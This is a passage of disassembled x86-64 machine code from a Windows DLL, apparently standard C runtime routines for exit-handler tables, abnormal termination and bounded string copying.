   1800071fa:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   180007200:	48 8b d7             	mov    %rdi,%rdx
   180007203:	48 8b ce             	mov    %rsi,%rcx
   180007206:	e8 e5 29 00 00       	call   0x180009bf0
   18000720b:	33 c9                	xor    %ecx,%ecx
   18000720d:	4c 8b f0             	mov    %rax,%r14
   180007210:	e8 7f 10 00 00       	call   0x180008294
   180007215:	4d 85 f6             	test   %r14,%r14
   180007218:	0f 84 ca 00 00 00    	je     0x1800072e8
   18000721e:	4c 8b 15 eb 2d 01 00 	mov    0x12deb(%rip),%r10        # 0x18001a010
   180007225:	4d 8d 0c de          	lea    (%r14,%rbx,8),%r9
   180007229:	49 8d 1c fe          	lea    (%r14,%rdi,8),%rbx
   18000722d:	49 8b f6             	mov    %r14,%rsi
   180007230:	48 8b cb             	mov    %rbx,%rcx
   180007233:	49 2b c9             	sub    %r9,%rcx
   180007236:	48 83 c1 07          	add    $0x7,%rcx
   18000723a:	48 c1 e9 03          	shr    $0x3,%rcx
   18000723e:	4c 3b cb             	cmp    %rbx,%r9
   180007241:	48 0f 47 cd          	cmova  %rbp,%rcx
   180007245:	48 85 c9             	test   %rcx,%rcx
   180007248:	74 10                	je     0x18000725a
   18000724a:	49 8b c2             	mov    %r10,%rax
   18000724d:	49 8b f9             	mov    %r9,%rdi
   180007250:	f3 48 ab             	rep stos %rax,(%rdi)
   180007253:	4c 8b 15 b6 2d 01 00 	mov    0x12db6(%rip),%r10        # 0x18001a010
   18000725a:	41 b8 40 00 00 00    	mov    $0x40,%r8d
   180007260:	49 8d 79 08          	lea    0x8(%r9),%rdi
   180007264:	41 8b c8             	mov    %r8d,%ecx
   180007267:	41 8b c2             	mov    %r10d,%eax
   18000726a:	83 e0 3f             	and    $0x3f,%eax
   18000726d:	2b c8                	sub    %eax,%ecx
   18000726f:	49 8b 47 08          	mov    0x8(%r15),%rax
   180007273:	48 8b 10             	mov    (%rax),%rdx
   180007276:	41 8b c0             	mov    %r8d,%eax
   180007279:	48 d3 ca             	ror    %cl,%rdx
   18000727c:	49 33 d2             	xor    %r10,%rdx
   18000727f:	49 89 11             	mov    %rdx,(%r9)
   180007282:	48 8b 15 87 2d 01 00 	mov    0x12d87(%rip),%rdx        # 0x18001a010
   180007289:	8b ca                	mov    %edx,%ecx
   18000728b:	83 e1 3f             	and    $0x3f,%ecx
   18000728e:	2b c1                	sub    %ecx,%eax
   180007290:	8a c8                	mov    %al,%cl
   180007292:	49 8b 07             	mov    (%r15),%rax
   180007295:	48 d3 ce             	ror    %cl,%rsi
   180007298:	48 33 f2             	xor    %rdx,%rsi
   18000729b:	48 8b 08             	mov    (%rax),%rcx
   18000729e:	48 89 31             	mov    %rsi,(%rcx)
   1800072a1:	41 8b c8             	mov    %r8d,%ecx
   1800072a4:	48 8b 15 65 2d 01 00 	mov    0x12d65(%rip),%rdx        # 0x18001a010
   1800072ab:	8b c2                	mov    %edx,%eax
   1800072ad:	83 e0 3f             	and    $0x3f,%eax
   1800072b0:	2b c8                	sub    %eax,%ecx
   1800072b2:	49 8b 07             	mov    (%r15),%rax
   1800072b5:	48 d3 cf             	ror    %cl,%rdi
   1800072b8:	48 33 fa             	xor    %rdx,%rdi
   1800072bb:	48 8b 10             	mov    (%rax),%rdx
   1800072be:	48 89 7a 08          	mov    %rdi,0x8(%rdx)
   1800072c2:	48 8b 15 47 2d 01 00 	mov    0x12d47(%rip),%rdx        # 0x18001a010
   1800072c9:	8b c2                	mov    %edx,%eax
   1800072cb:	83 e0 3f             	and    $0x3f,%eax
   1800072ce:	44 2b c0             	sub    %eax,%r8d
   1800072d1:	49 8b 07             	mov    (%r15),%rax
   1800072d4:	41 8a c8             	mov    %r8b,%cl
   1800072d7:	48 d3 cb             	ror    %cl,%rbx
   1800072da:	48 33 da             	xor    %rdx,%rbx
   1800072dd:	48 8b 08             	mov    (%rax),%rcx
   1800072e0:	33 c0                	xor    %eax,%eax
   1800072e2:	48 89 59 10          	mov    %rbx,0x10(%rcx)
   1800072e6:	eb 03                	jmp    0x1800072eb
   1800072e8:	83 c8 ff             	or     $0xffffffff,%eax
   1800072eb:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   1800072f0:	48 8b 6c 24 50       	mov    0x50(%rsp),%rbp
   1800072f5:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   1800072fa:	48 83 c4 20          	add    $0x20,%rsp
   1800072fe:	41 5f                	pop    %r15
   180007300:	41 5e                	pop    %r14
   180007302:	5f                   	pop    %rdi
   180007303:	c3                   	ret
   180007304:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180007309:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   18000730e:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   180007313:	57                   	push   %rdi
   180007314:	41 56                	push   %r14
   180007316:	41 57                	push   %r15
   180007318:	48 83 ec 20          	sub    $0x20,%rsp
   18000731c:	48 8b 01             	mov    (%rcx),%rax
   18000731f:	48 8b f1             	mov    %rcx,%rsi
   180007322:	48 8b 18             	mov    (%rax),%rbx
   180007325:	48 85 db             	test   %rbx,%rbx
   180007328:	75 08                	jne    0x180007332
   18000732a:	83 c8 ff             	or     $0xffffffff,%eax
   18000732d:	e9 cf 00 00 00       	jmp    0x180007401
   180007332:	4c 8b 05 d7 2c 01 00 	mov    0x12cd7(%rip),%r8        # 0x18001a010
   180007339:	41 8b c8             	mov    %r8d,%ecx
   18000733c:	49 8b f8             	mov    %r8,%rdi
   18000733f:	48 33 3b             	xor    (%rbx),%rdi
   180007342:	83 e1 3f             	and    $0x3f,%ecx
   180007345:	48 8b 5b 08          	mov    0x8(%rbx),%rbx
   180007349:	48 d3 cf             	ror    %cl,%rdi
   18000734c:	49 33 d8             	xor    %r8,%rbx
   18000734f:	48 d3 cb             	ror    %cl,%rbx
   180007352:	48 8d 47 ff          	lea    -0x1(%rdi),%rax
   180007356:	48 83 f8 fd          	cmp    $0xfffffffffffffffd,%rax
   18000735a:	0f 87 9f 00 00 00    	ja     0x1800073ff
   180007360:	41 8b c8             	mov    %r8d,%ecx
   180007363:	4d 8b f0             	mov    %r8,%r14
   180007366:	83 e1 3f             	and    $0x3f,%ecx
   180007369:	4c 8b ff             	mov    %rdi,%r15
   18000736c:	48 8b eb             	mov    %rbx,%rbp
   18000736f:	48 83 eb 08          	sub    $0x8,%rbx
   180007373:	48 3b df             	cmp    %rdi,%rbx
   180007376:	72 55                	jb     0x1800073cd
   180007378:	48 8b 03             	mov    (%rbx),%rax
   18000737b:	49 3b c6             	cmp    %r14,%rax
   18000737e:	74 ef                	je     0x18000736f
   180007380:	49 33 c0             	xor    %r8,%rax
   180007383:	4c 89 33             	mov    %r14,(%rbx)
   180007386:	48 d3 c8             	ror    %cl,%rax
   180007389:	ff 15 d9 8e 00 00    	call   *0x8ed9(%rip)        # 0x180010268
   18000738f:	4c 8b 05 7a 2c 01 00 	mov    0x12c7a(%rip),%r8        # 0x18001a010
   180007396:	48 8b 06             	mov    (%rsi),%rax
   180007399:	41 8b c8             	mov    %r8d,%ecx
   18000739c:	83 e1 3f             	and    $0x3f,%ecx
   18000739f:	48 8b 10             	mov    (%rax),%rdx
   1800073a2:	4c 8b 0a             	mov    (%rdx),%r9
   1800073a5:	48 8b 42 08          	mov    0x8(%rdx),%rax
   1800073a9:	4d 33 c8             	xor    %r8,%r9
   1800073ac:	49 33 c0             	xor    %r8,%rax
   1800073af:	49 d3 c9             	ror    %cl,%r9
   1800073b2:	48 d3 c8             	ror    %cl,%rax
   1800073b5:	4d 3b cf             	cmp    %r15,%r9
   1800073b8:	75 05                	jne    0x1800073bf
   1800073ba:	48 3b c5             	cmp    %rbp,%rax
   1800073bd:	74 b0                	je     0x18000736f
   1800073bf:	4d 8b f9             	mov    %r9,%r15
   1800073c2:	49 8b f9             	mov    %r9,%rdi
   1800073c5:	48 8b e8             	mov    %rax,%rbp
   1800073c8:	48 8b d8             	mov    %rax,%rbx
   1800073cb:	eb a2                	jmp    0x18000736f
   1800073cd:	48 83 ff ff          	cmp    $0xffffffffffffffff,%rdi
   1800073d1:	74 0f                	je     0x1800073e2
   1800073d3:	48 8b cf             	mov    %rdi,%rcx
   1800073d6:	e8 b9 0e 00 00       	call   0x180008294
   1800073db:	4c 8b 05 2e 2c 01 00 	mov    0x12c2e(%rip),%r8        # 0x18001a010
   1800073e2:	48 8b 06             	mov    (%rsi),%rax
   1800073e5:	48 8b 08             	mov    (%rax),%rcx
   1800073e8:	4c 89 01             	mov    %r8,(%rcx)
   1800073eb:	48 8b 06             	mov    (%rsi),%rax
   1800073ee:	48 8b 08             	mov    (%rax),%rcx
   1800073f1:	4c 89 41 08          	mov    %r8,0x8(%rcx)
   1800073f5:	48 8b 06             	mov    (%rsi),%rax
   1800073f8:	48 8b 08             	mov    (%rax),%rcx
   1800073fb:	4c 89 41 10          	mov    %r8,0x10(%rcx)
   1800073ff:	33 c0                	xor    %eax,%eax
   180007401:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   180007406:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   18000740b:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   180007410:	48 83 c4 20          	add    $0x20,%rsp
   180007414:	41 5f                	pop    %r15
   180007416:	41 5e                	pop    %r14
   180007418:	5f                   	pop    %rdi
   180007419:	c3                   	ret
   18000741a:	cc                   	int3
   18000741b:	cc                   	int3
   18000741c:	48 8b d1             	mov    %rcx,%rdx
   18000741f:	48 8d 0d 82 3f 01 00 	lea    0x13f82(%rip),%rcx        # 0x18001b3a8
   180007426:	e9 65 00 00 00       	jmp    0x180007490
   18000742b:	cc                   	int3
   18000742c:	4c 8b dc             	mov    %rsp,%r11
   18000742f:	49 89 4b 08          	mov    %rcx,0x8(%r11)
   180007433:	48 83 ec 38          	sub    $0x38,%rsp
   180007437:	49 8d 43 08          	lea    0x8(%r11),%rax
   18000743b:	49 89 43 e8          	mov    %rax,-0x18(%r11)
   18000743f:	4d 8d 4b 18          	lea    0x18(%r11),%r9
   180007443:	b8 02 00 00 00       	mov    $0x2,%eax
   180007448:	4d 8d 43 e8          	lea    -0x18(%r11),%r8
   18000744c:	49 8d 53 20          	lea    0x20(%r11),%rdx
   180007450:	89 44 24 50          	mov    %eax,0x50(%rsp)
   180007454:	49 8d 4b 10          	lea    0x10(%r11),%rcx
   180007458:	89 44 24 58          	mov    %eax,0x58(%rsp)
   18000745c:	e8 b7 fc ff ff       	call   0x180007118
   180007461:	48 83 c4 38          	add    $0x38,%rsp
   180007465:	c3                   	ret
   180007466:	cc                   	int3
   180007467:	cc                   	int3
   180007468:	48 85 c9             	test   %rcx,%rcx
   18000746b:	75 04                	jne    0x180007471
   18000746d:	83 c8 ff             	or     $0xffffffff,%eax
   180007470:	c3                   	ret
   180007471:	48 8b 41 10          	mov    0x10(%rcx),%rax
   180007475:	48 39 01             	cmp    %rax,(%rcx)
   180007478:	75 12                	jne    0x18000748c
   18000747a:	48 8b 05 8f 2b 01 00 	mov    0x12b8f(%rip),%rax        # 0x18001a010
   180007481:	48 89 01             	mov    %rax,(%rcx)
   180007484:	48 89 41 08          	mov    %rax,0x8(%rcx)
   180007488:	48 89 41 10          	mov    %rax,0x10(%rcx)
   18000748c:	33 c0                	xor    %eax,%eax
   18000748e:	c3                   	ret
   18000748f:	cc                   	int3
   180007490:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   180007495:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   18000749a:	55                   	push   %rbp
   18000749b:	48 8b ec             	mov    %rsp,%rbp
   18000749e:	48 83 ec 40          	sub    $0x40,%rsp
   1800074a2:	48 8d 45 10          	lea    0x10(%rbp),%rax
   1800074a6:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   1800074aa:	4c 8d 4d 28          	lea    0x28(%rbp),%r9
   1800074ae:	48 8d 45 18          	lea    0x18(%rbp),%rax
   1800074b2:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   1800074b6:	4c 8d 45 e8          	lea    -0x18(%rbp),%r8
   1800074ba:	b8 02 00 00 00       	mov    $0x2,%eax
   1800074bf:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
   1800074c3:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   1800074c7:	89 45 28             	mov    %eax,0x28(%rbp)
   1800074ca:	89 45 e0             	mov    %eax,-0x20(%rbp)
   1800074cd:	e8 0a fc ff ff       	call   0x1800070dc
   1800074d2:	48 83 c4 40          	add    $0x40,%rsp
   1800074d6:	5d                   	pop    %rbp
   1800074d7:	c3                   	ret
   1800074d8:	48 8d 05 c1 30 01 00 	lea    0x130c1(%rip),%rax        # 0x18001a5a0
   1800074df:	48 89 05 7a 47 01 00 	mov    %rax,0x1477a(%rip)        # 0x18001bc60
   1800074e6:	b0 01                	mov    $0x1,%al
   1800074e8:	c3                   	ret
   1800074e9:	cc                   	int3
   1800074ea:	cc                   	int3
   1800074eb:	cc                   	int3
   1800074ec:	48 83 ec 28          	sub    $0x28,%rsp
   1800074f0:	48 8d 0d b1 3e 01 00 	lea    0x13eb1(%rip),%rcx        # 0x18001b3a8
   1800074f7:	e8 6c ff ff ff       	call   0x180007468
   1800074fc:	48 8d 0d bd 3e 01 00 	lea    0x13ebd(%rip),%rcx        # 0x18001b3c0
   180007503:	e8 60 ff ff ff       	call   0x180007468
   180007508:	b0 01                	mov    $0x1,%al
   18000750a:	48 83 c4 28          	add    $0x28,%rsp
   18000750e:	c3                   	ret
   18000750f:	cc                   	int3
   180007510:	b0 01                	mov    $0x1,%al
   180007512:	c3                   	ret
   180007513:	cc                   	int3
   180007514:	48 83 ec 28          	sub    $0x28,%rsp
   180007518:	e8 7f fb ff ff       	call   0x18000709c
   18000751d:	b0 01                	mov    $0x1,%al
   18000751f:	48 83 c4 28          	add    $0x28,%rsp
   180007523:	c3                   	ret
   180007524:	40 53                	rex push %rbx
   180007526:	48 83 ec 20          	sub    $0x20,%rsp
   18000752a:	48 8b 1d df 2a 01 00 	mov    0x12adf(%rip),%rbx        # 0x18001a010
   180007531:	48 8b cb             	mov    %rbx,%rcx
   180007534:	e8 4b f0 ff ff       	call   0x180006584
   180007539:	48 8b cb             	mov    %rbx,%rcx
   18000753c:	e8 47 01 00 00       	call   0x180007688
   180007541:	48 8b cb             	mov    %rbx,%rcx
   180007544:	e8 ab 30 00 00       	call   0x18000a5f4
   180007549:	48 8b cb             	mov    %rbx,%rcx
   18000754c:	e8 4f 33 00 00       	call   0x18000a8a0
   180007551:	48 8b cb             	mov    %rbx,%rcx
   180007554:	e8 7f f5 ff ff       	call   0x180006ad8
   180007559:	b0 01                	mov    $0x1,%al
   18000755b:	48 83 c4 20          	add    $0x20,%rsp
   18000755f:	5b                   	pop    %rbx
   180007560:	c3                   	ret
   180007561:	cc                   	int3
   180007562:	cc                   	int3
   180007563:	cc                   	int3
   180007564:	33 c9                	xor    %ecx,%ecx
   180007566:	e9 a5 be ff ff       	jmp    0x180003410
   18000756b:	cc                   	int3
   18000756c:	40 53                	rex push %rbx
   18000756e:	48 83 ec 20          	sub    $0x20,%rsp
   180007572:	48 8b 0d af 40 01 00 	mov    0x140af(%rip),%rcx        # 0x18001b628
   180007579:	83 c8 ff             	or     $0xffffffff,%eax
   18000757c:	f0 0f c1 01          	lock xadd %eax,(%rcx)
   180007580:	83 f8 01             	cmp    $0x1,%eax
   180007583:	75 1f                	jne    0x1800075a4
   180007585:	48 8b 0d 9c 40 01 00 	mov    0x1409c(%rip),%rcx        # 0x18001b628
   18000758c:	48 8d 1d cd 2a 01 00 	lea    0x12acd(%rip),%rbx        # 0x18001a060
   180007593:	48 3b cb             	cmp    %rbx,%rcx
   180007596:	74 0c                	je     0x1800075a4
   180007598:	e8 f7 0c 00 00       	call   0x180008294
   18000759d:	48 89 1d 84 40 01 00 	mov    %rbx,0x14084(%rip)        # 0x18001b628
   1800075a4:	b0 01                	mov    $0x1,%al
   1800075a6:	48 83 c4 20          	add    $0x20,%rsp
   1800075aa:	5b                   	pop    %rbx
   1800075ab:	c3                   	ret
   1800075ac:	48 83 ec 28          	sub    $0x28,%rsp
   1800075b0:	48 8b 0d c1 46 01 00 	mov    0x146c1(%rip),%rcx        # 0x18001bc78
   1800075b7:	e8 d8 0c 00 00       	call   0x180008294
   1800075bc:	48 8b 0d bd 46 01 00 	mov    0x146bd(%rip),%rcx        # 0x18001bc80
   1800075c3:	48 83 25 ad 46 01 00 	andq   $0x0,0x146ad(%rip)        # 0x18001bc78
   1800075ca:	00 
   1800075cb:	e8 c4 0c 00 00       	call   0x180008294
   1800075d0:	48 8b 0d 71 40 01 00 	mov    0x14071(%rip),%rcx        # 0x18001b648
   1800075d7:	48 83 25 a1 46 01 00 	andq   $0x0,0x146a1(%rip)        # 0x18001bc80
   1800075de:	00 
   1800075df:	e8 b0 0c 00 00       	call   0x180008294
   1800075e4:	48 8b 0d 65 40 01 00 	mov    0x14065(%rip),%rcx        # 0x18001b650
   1800075eb:	48 83 25 55 40 01 00 	andq   $0x0,0x14055(%rip)        # 0x18001b648
   1800075f2:	00 
   1800075f3:	e8 9c 0c 00 00       	call   0x180008294
   1800075f8:	48 83 25 50 40 01 00 	andq   $0x0,0x14050(%rip)        # 0x18001b650
   1800075ff:	00 
   180007600:	b0 01                	mov    $0x1,%al
   180007602:	48 83 c4 28          	add    $0x28,%rsp
   180007606:	c3                   	ret
   180007607:	cc                   	int3
   180007608:	48 8d 15 a1 9f 00 00 	lea    0x9fa1(%rip),%rdx        # 0x1800115b0
   18000760f:	48 8d 0d 9a 9e 00 00 	lea    0x9e9a(%rip),%rcx        # 0x1800114b0
   180007616:	e9 a5 2e 00 00       	jmp    0x18000a4c0
   18000761b:	cc                   	int3
   18000761c:	48 83 ec 28          	sub    $0x28,%rsp
   180007620:	e8 ff 08 00 00       	call   0x180007f24
   180007625:	48 85 c0             	test   %rax,%rax
   180007628:	0f 95 c0             	setne  %al
   18000762b:	48 83 c4 28          	add    $0x28,%rsp
   18000762f:	c3                   	ret
   180007630:	48 83 ec 28          	sub    $0x28,%rsp
   180007634:	e8 2b 07 00 00       	call   0x180007d64
   180007639:	b0 01                	mov    $0x1,%al
   18000763b:	48 83 c4 28          	add    $0x28,%rsp
   18000763f:	c3                   	ret
   180007640:	48 83 ec 28          	sub    $0x28,%rsp
   180007644:	84 c9                	test   %cl,%cl
   180007646:	74 16                	je     0x18000765e
   180007648:	48 83 3d 20 46 01 00 	cmpq   $0x0,0x14620(%rip)        # 0x18001bc70
   18000764f:	00 
   180007650:	74 05                	je     0x180007657
   180007652:	e8 25 35 00 00       	call   0x18000ab7c
   180007657:	b0 01                	mov    $0x1,%al
   180007659:	48 83 c4 28          	add    $0x28,%rsp
   18000765d:	c3                   	ret
   18000765e:	48 8d 15 4b 9f 00 00 	lea    0x9f4b(%rip),%rdx        # 0x1800115b0
   180007665:	48 8d 0d 44 9e 00 00 	lea    0x9e44(%rip),%rcx        # 0x1800114b0
   18000766c:	48 83 c4 28          	add    $0x28,%rsp
   180007670:	e9 cb 2e 00 00       	jmp    0x18000a540
   180007675:	cc                   	int3
   180007676:	cc                   	int3
   180007677:	cc                   	int3
   180007678:	48 83 ec 28          	sub    $0x28,%rsp
   18000767c:	e8 ab 09 00 00       	call   0x18000802c
   180007681:	b0 01                	mov    $0x1,%al
   180007683:	48 83 c4 28          	add    $0x28,%rsp
   180007687:	c3                   	ret
   180007688:	48 89 0d 49 3d 01 00 	mov    %rcx,0x13d49(%rip)        # 0x18001b3d8
   18000768f:	c3                   	ret
   180007690:	40 53                	rex push %rbx
   180007692:	48 83 ec 20          	sub    $0x20,%rsp
   180007696:	48 8b d9             	mov    %rcx,%rbx
   180007699:	e8 22 00 00 00       	call   0x1800076c0
   18000769e:	48 85 c0             	test   %rax,%rax
   1800076a1:	74 14                	je     0x1800076b7
   1800076a3:	48 8b cb             	mov    %rbx,%rcx
   1800076a6:	ff 15 bc 8b 00 00    	call   *0x8bbc(%rip)        # 0x180010268
   1800076ac:	85 c0                	test   %eax,%eax
   1800076ae:	74 07                	je     0x1800076b7
   1800076b0:	b8 01 00 00 00       	mov    $0x1,%eax
   1800076b5:	eb 02                	jmp    0x1800076b9
   1800076b7:	33 c0                	xor    %eax,%eax
   1800076b9:	48 83 c4 20          	add    $0x20,%rsp
   1800076bd:	5b                   	pop    %rbx
   1800076be:	c3                   	ret
   1800076bf:	cc                   	int3
   1800076c0:	40 53                	rex push %rbx
   1800076c2:	48 83 ec 20          	sub    $0x20,%rsp
   1800076c6:	33 c9                	xor    %ecx,%ecx
   1800076c8:	e8 cb 09 00 00       	call   0x180008098
   1800076cd:	90                   	nop
   1800076ce:	48 8b 1d 3b 29 01 00 	mov    0x1293b(%rip),%rbx        # 0x18001a010
   1800076d5:	8b cb                	mov    %ebx,%ecx
   1800076d7:	83 e1 3f             	and    $0x3f,%ecx
   1800076da:	48 33 1d f7 3c 01 00 	xor    0x13cf7(%rip),%rbx        # 0x18001b3d8
   1800076e1:	48 d3 cb             	ror    %cl,%rbx
   1800076e4:	33 c9                	xor    %ecx,%ecx
   1800076e6:	e8 01 0a 00 00       	call   0x1800080ec
   1800076eb:	48 8b c3             	mov    %rbx,%rax
   1800076ee:	48 83 c4 20          	add    $0x20,%rsp
   1800076f2:	5b                   	pop    %rbx
   1800076f3:	c3                   	ret
   1800076f4:	e9 1f 36 00 00       	jmp    0x18000ad18
   1800076f9:	cc                   	int3
   1800076fa:	cc                   	int3
   1800076fb:	cc                   	int3
   1800076fc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180007701:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   180007706:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   18000770b:	57                   	push   %rdi
   18000770c:	48 83 ec 20          	sub    $0x20,%rsp
   180007710:	33 ed                	xor    %ebp,%ebp
   180007712:	48 8b fa             	mov    %rdx,%rdi
   180007715:	48 2b f9             	sub    %rcx,%rdi
   180007718:	48 8b d9             	mov    %rcx,%rbx
   18000771b:	48 83 c7 07          	add    $0x7,%rdi
   18000771f:	8b f5                	mov    %ebp,%esi
   180007721:	48 c1 ef 03          	shr    $0x3,%rdi
   180007725:	48 3b ca             	cmp    %rdx,%rcx
   180007728:	48 0f 47 fd          	cmova  %rbp,%rdi
   18000772c:	48 85 ff             	test   %rdi,%rdi
   18000772f:	74 1a                	je     0x18000774b
   180007731:	48 8b 03             	mov    (%rbx),%rax
   180007734:	48 85 c0             	test   %rax,%rax
   180007737:	74 06                	je     0x18000773f
   180007739:	ff 15 29 8b 00 00    	call   *0x8b29(%rip)        # 0x180010268
   18000773f:	48 83 c3 08          	add    $0x8,%rbx
   180007743:	48 ff c6             	inc    %rsi
   180007746:	48 3b f7             	cmp    %rdi,%rsi
   180007749:	75 e6                	jne    0x180007731
   18000774b:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180007750:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   180007755:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   18000775a:	48 83 c4 20          	add    $0x20,%rsp
   18000775e:	5f                   	pop    %rdi
   18000775f:	c3                   	ret
   180007760:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180007765:	57                   	push   %rdi
   180007766:	48 83 ec 20          	sub    $0x20,%rsp
   18000776a:	48 8b fa             	mov    %rdx,%rdi
   18000776d:	48 8b d9             	mov    %rcx,%rbx
   180007770:	48 3b ca             	cmp    %rdx,%rcx
   180007773:	74 1b                	je     0x180007790
   180007775:	48 8b 03             	mov    (%rbx),%rax
   180007778:	48 85 c0             	test   %rax,%rax
   18000777b:	74 0a                	je     0x180007787
   18000777d:	ff 15 e5 8a 00 00    	call   *0x8ae5(%rip)        # 0x180010268
   180007783:	85 c0                	test   %eax,%eax
   180007785:	75 0b                	jne    0x180007792
   180007787:	48 83 c3 08          	add    $0x8,%rbx
   18000778b:	48 3b df             	cmp    %rdi,%rbx
   18000778e:	eb e3                	jmp    0x180007773
   180007790:	33 c0                	xor    %eax,%eax
   180007792:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180007797:	48 83 c4 20          	add    $0x20,%rsp
   18000779b:	5f                   	pop    %rdi
   18000779c:	c3                   	ret
   18000779d:	cc                   	int3
   18000779e:	cc                   	int3
   18000779f:	cc                   	int3
   1800077a0:	48 83 ec 28          	sub    $0x28,%rsp
   1800077a4:	e8 ff 05 00 00       	call   0x180007da8
   1800077a9:	48 8b 40 18          	mov    0x18(%rax),%rax
   1800077ad:	48 85 c0             	test   %rax,%rax
   1800077b0:	74 08                	je     0x1800077ba
   1800077b2:	ff 15 b0 8a 00 00    	call   *0x8ab0(%rip)        # 0x180010268
   1800077b8:	eb 00                	jmp    0x1800077ba
   1800077ba:	e8 15 00 00 00       	call   0x1800077d4
   1800077bf:	90                   	nop
   1800077c0:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%rsp)
   1800077c7:	00 
   1800077c8:	8b 44 24 10          	mov    0x10(%rsp),%eax
   1800077cc:	e9 c3 0a 00 00       	jmp    0x180008294
   1800077d1:	cc                   	int3
   1800077d2:	cc                   	int3
   1800077d3:	cc                   	int3
   1800077d4:	48 83 ec 28          	sub    $0x28,%rsp
   1800077d8:	e8 e7 2d 00 00       	call   0x18000a5c4
   1800077dd:	48 85 c0             	test   %rax,%rax
   1800077e0:	74 0a                	je     0x1800077ec
   1800077e2:	b9 16 00 00 00       	mov    $0x16,%ecx
   1800077e7:	e8 28 2e 00 00       	call   0x18000a614
   1800077ec:	f6 05 4d 28 01 00 02 	testb  $0x2,0x1284d(%rip)        # 0x18001a040
   1800077f3:	74 2a                	je     0x18000781f
   1800077f5:	b9 17 00 00 00       	mov    $0x17,%ecx
   1800077fa:	ff 15 58 88 00 00    	call   *0x8858(%rip)        # 0x180010058
   180007800:	85 c0                	test   %eax,%eax
   180007802:	74 07                	je     0x18000780b
   180007804:	b9 07 00 00 00       	mov    $0x7,%ecx
   180007809:	cd 29                	int    $0x29
   18000780b:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   180007811:	ba 15 00 00 40       	mov    $0x40000015,%edx
   180007816:	41 8d 48 02          	lea    0x2(%r8),%ecx
   18000781a:	e8 09 ec ff ff       	call   0x180006428
   18000781f:	b9 03 00 00 00       	mov    $0x3,%ecx
   180007824:	e8 c7 f2 ff ff       	call   0x180006af0
   180007829:	cc                   	int3
   18000782a:	cc                   	int3
   18000782b:	cc                   	int3
   18000782c:	40 53                	rex push %rbx
   18000782e:	48 83 ec 20          	sub    $0x20,%rsp
   180007832:	33 db                	xor    %ebx,%ebx
   180007834:	48 85 c9             	test   %rcx,%rcx
   180007837:	74 0c                	je     0x180007845
   180007839:	48 85 d2             	test   %rdx,%rdx
   18000783c:	74 07                	je     0x180007845
   18000783e:	4d 85 c0             	test   %r8,%r8
   180007841:	75 1b                	jne    0x18000785e
   180007843:	88 19                	mov    %bl,(%rcx)
   180007845:	e8 b2 09 00 00       	call   0x1800081fc
   18000784a:	bb 16 00 00 00       	mov    $0x16,%ebx
   18000784f:	89 18                	mov    %ebx,(%rax)
   180007851:	e8 e6 ed ff ff       	call   0x18000663c
   180007856:	8b c3                	mov    %ebx,%eax
   180007858:	48 83 c4 20          	add    $0x20,%rsp
   18000785c:	5b                   	pop    %rbx
   18000785d:	c3                   	ret
   18000785e:	4c 8b c9             	mov    %rcx,%r9
   180007861:	4c 2b c1             	sub    %rcx,%r8
   180007864:	43 8a 04 08          	mov    (%r8,%r9,1),%al
   180007868:	41 88 01             	mov    %al,(%r9)
   18000786b:	49 ff c1             	inc    %r9
   18000786e:	84 c0                	test   %al,%al
   180007870:	74 06                	je     0x180007878
   180007872:	48 83 ea 01          	sub    $0x1,%rdx
   180007876:	75 ec                	jne    0x180007864
   180007878:	48 85 d2             	test   %rdx,%rdx
   18000787b:	75 d9                	jne    0x180007856
   18000787d:	88 19                	mov    %bl,(%rcx)
   18000787f:	e8 78 09 00 00       	call   0x1800081fc
   180007884:	bb 22 00 00 00       	mov    $0x22,%ebx
   180007889:	eb c4                	jmp    0x18000784f
   18000788b:	cc                   	int3
   18000788c:	e9 8b 09 00 00       	jmp    0x18000821c
   180007891:	cc                   	int3
   180007892:	cc                   	int3
   180007893:	cc                   	int3
   180007894:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180007899:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   18000789e:	57                   	push   %rdi
   18000789f:	48 83 ec 20          	sub    $0x20,%rsp
   1800078a3:	c6 41 18 00          	movb   $0x0,0x18(%rcx)
   1800078a7:	48 8b f9             	mov    %rcx,%rdi
   1800078aa:	48 8d 71 08          	lea    0x8(%rcx),%rsi
   1800078ae:	48 85 d2             	test   %rdx,%rdx
   1800078b1:	74 05                	je     0x1800078b8
   1800078b3:	0f 10 02             	movups (%rdx),%xmm0
   1800078b6:	eb 10                	jmp    0x1800078c8
   1800078b8:	83 3d d1 43 01 00 00 	cmpl   $0x0,0x143d1(%rip)        # 0x18001bc90
   1800078bf:	75 0d                	jne    0x1800078ce
   1800078c1:	0f 10 05 30 2e 01 00 	movups 0x12e30(%rip),%xmm0        # 0x18001a6f8
   1800078c8:	f3 0f 7f 06          	movdqu %xmm0,(%rsi)
   1800078cc:	eb 4e                	jmp    0x18000791c
   1800078ce:	e8 d5 04 00 00       	call   0x180007da8
   1800078d3:	48 89 07             	mov    %rax,(%rdi)
   1800078d6:	48 8b d6             	mov    %rsi,%rdx
   1800078d9:	48 8b 88 90 00 00 00 	mov    0x90(%rax),%rcx
   1800078e0:	48 89 0e             	mov    %rcx,(%rsi)
